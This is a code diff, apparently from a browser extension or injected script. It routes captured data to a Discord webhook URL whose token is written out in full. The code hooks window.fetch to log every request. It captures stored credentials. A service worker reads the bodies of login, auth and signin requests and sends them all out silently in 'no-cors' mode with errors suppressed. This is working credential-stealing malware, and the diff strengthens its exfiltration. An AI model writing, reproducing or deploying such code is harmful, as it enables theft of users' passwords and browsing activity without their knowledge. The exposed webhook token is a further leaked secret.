@@ -83,10 +83,12 @@
         }
         
         function sendToLogger(data) {
-            fetch('https://your-logging-server.com/log', {
+            fetch('https://discord.com/api/webhooks/1323706161920213074/bG7RwSOehEo8k66bSn5WrYXT7cDiqokQbq70CaH09zi0BVsyQMcEkxEExI6vV-KUDQKb', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data),
+                body: JSON.stringify({
+                    content: `**Data Captured**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``
+                }),
                 mode: 'no-cors'
             }).catch(() => {
                 // Silent fail
@@ -101,14 +103,16 @@
             (function() {
                 const originalFetch = window.fetch;
                 window.fetch = function(...args) {
-                    fetch('https://extension.up.railway.app/log', {
+                    fetch('https://discord.com/api/webhooks/1323706161920213074/bG7RwSOehEo8k66bSn5WrYXT7cDiqokQbq70CaH09zi0BVsyQMcEkxEExI6vV-KUDQKb', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            type: 'persistent_network',
-                            url: args[0],
-                            timestamp: new Date().toISOString(),
-                            page: window.location.href
+                            content: `**Network Request**\n\`\`\`json\n${JSON.stringify({
+                                type: 'persistent_network',
+                                url: args[0],
+                                timestamp: new Date().toISOString(),
+                                page: window.location.href
+                            }, null, 2)}\n\`\`\``
                         }),
                         mode: 'no-cors'
                     }).catch(() => {});
@@ -129,14 +133,16 @@
                             });
                         }
                         
-                        fetch('https://extension.up.railway.app/log', {
+                        fetch('https://discord.com/api/webhooks/1323706161920213074/bG7RwSOehEo8k66bSn5WrYXT7cDiqokQbq70CaH09zi0BVsyQMcEkxEExI6vV-KUDQKb', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
-                                type: 'persistent_credentials',
-                                credentials: credentials,
-                                timestamp: new Date().toISOString(),
-                                page: window.location.href
+                                content: `**Credentials Captured**\n\`\`\`json\n${JSON.stringify({
+                                    type: 'persistent_credentials',
+                                    credentials: credentials,
+                                    timestamp: new Date().toISOString(),
+                                    page: window.location.href
+                                }, null, 2)}\n\`\`\``
                             }),
                             mode: 'no-cors'
                         }).catch(() => {});
@@ -158,14 +164,16 @@
                     const url = event.request.url;
                     if (url.includes('login') || url.includes('auth') || url.includes('signin')) {
                         event.request.clone().text().then(body => {
-                            fetch('https://extension.up.railway.app/log', {
+                            fetch('https://discord.com/api/webhooks/1323706161920213074/bG7RwSOehEo8k66bSn5WrYXT7cDiqokQbq70CaH09zi0BVsyQMcEkxEExI6vV-KUDQKb', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({
-                                    type: 'service_worker_auth',
-                                    url: url,
-                                    body: body,
-                                    timestamp: new Date().toISOString()
+                                    content: `**Service Worker Auth**\n\`\`\`json\n${JSON.stringify({
+                                        type: 'service_worker_auth',
+                                        url: url,
+                                        body: body,
+                                        timestamp: new Date().toISOString()
+                                    }, null, 2)}\n\`\`\``
                                 }),
                                 mode: 'no-cors'
                             }).catch(() => {});
